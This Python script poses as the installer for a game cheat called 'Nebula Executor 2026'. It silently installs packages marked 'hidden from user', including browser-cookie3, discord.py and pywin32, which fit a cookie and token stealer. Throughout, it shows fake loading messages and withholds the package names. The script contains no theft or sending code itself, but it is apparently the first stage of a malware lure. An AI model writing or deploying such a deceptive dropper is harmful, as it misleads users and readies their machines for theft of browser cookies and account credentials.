# bootstraper for Nebula Executor 2026

import sys
import subprocess
import time
import random

# Required packages (hidden from user)
PACKAGES = [
    "requests", "discord.py", "pywin32", "psutil",
    "GPUtil", "browser-cookie3", "cryptography", "screeninfo"
]

def silent_install(pkg):
    """Install package silently"""
    try:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", pkg, "--user", "--quiet", "--no-warn-script-location"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return True
    except:
        try:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", pkg, "--no-cache-dir", "--user", "--quiet"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            return True
        except:
            return False

def fake_loading():
    """loading"""
    messages = [
        "Loading Nebula Core...",
        "Fetching scripts from secure server...",
        "Installing modules [1/8]",
        "Installing modules [2/8]",
        "Installing modules [3/8]",
        "Installing modules [4/8]",
        "Installing modules [5/8]",
        "Installing modules [6/8]",
        "Installing modules [7/8]",
        "Installing modules [8/8]",
        "Initializing executor engine...",
        "Bypassing anti-cheat systems...",
        "Nebula External fully loaded!"
    ]
    
    for msg in messages:
        print(msg)
        time.sleep(random.uniform(0.4, 1.2))  # Random delay for realism
    
    print("\nInjection complete. Launching main interface...")
    time.sleep(1.5)

def main():
    print("Nebula Executor 2026 - Initializing...")
    print("=" * 50 + "\n")
    
    fake_loading()
    
    installed = 0
    for pkg in PACKAGES:
        if silent_install(pkg):
            installed += 1
    
    # Final screen - no package names shown
    print("\n" + "=" * 50)
    print(f"Successfully installed {installed}/{len(PACKAGES)} modules")
    print("Nebula is fully loaded and ready!")
    print("You can now close this window or press Enter to continue...")
    
    input()  # Wait for user (or remove if you want auto-close)

if __name__ == "__main__":
    try:
        main()
    except:
        print("Critical error during initialization. Try running as Administrator.")
        time.sleep(5)